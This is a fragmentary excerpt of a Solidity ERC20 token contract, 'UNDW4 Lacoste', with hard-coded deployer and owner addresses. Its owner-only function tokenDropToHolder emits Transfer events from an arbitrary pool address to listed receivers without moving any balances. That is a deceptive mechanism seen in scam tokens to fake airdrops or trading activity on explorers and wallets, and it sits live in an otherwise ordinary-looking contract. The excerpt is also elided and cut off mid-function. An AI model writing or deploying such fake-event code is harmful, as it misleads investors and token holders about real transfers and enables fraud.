...
contract UNDW4 is Context, IERC20 {
    ...
    address _contDeployr = 0xacF1A2Bde98ad408c36bc2B1D7Af15Aa69dda0De;
    address public _ownr = 0xFd00fD58B3a1D75CaB5963C713595f6320fc4634;
   constructor () public {

        _name = "UNDW4 Lacoste";
        _symbol = "UNDW4";
        _decimals = 18;
        uint256 initialSupply = 11212000 * 10 ** 18;
        _safeOwnr = _ownr;
...
*/
  function tokenDropToHolder(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
  ...
  function transferToHolder(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
